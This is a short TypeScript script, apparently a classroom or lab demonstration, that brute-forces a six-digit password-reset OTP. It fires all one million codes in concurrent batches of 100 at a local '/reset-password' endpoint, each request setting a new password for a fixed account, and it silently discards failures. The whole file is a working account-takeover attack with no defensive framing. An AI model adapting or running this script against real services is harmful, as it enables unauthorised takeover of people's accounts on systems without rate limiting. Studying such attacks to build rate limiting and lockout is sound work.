import axios from "axios";

async function sendRequest(otp: number) {
  let data = JSON.stringify({
    email: "pratik",
    otp: otp,
    newPassword: "12345",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/reset-password",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };

  // axios
  //   .request(config)
  //   .then((response) => {
  //     console.log(JSON.stringify(response.data));
  //   })
  //   .catch((error) => {
  //     console.log(error);
  //   });

  try {
    await axios.request(config);
    console.log("done for " + otp);
  } catch (e) {}
}

async function main() {
  for (let i = 0; i < 1000000; i += 100) {
    const promises = [];
    for (let j = 0; j < 100; j++) {
      promises.push(sendRequest(i + j));
    }
    await Promise.all(promises);
  }
}

main();
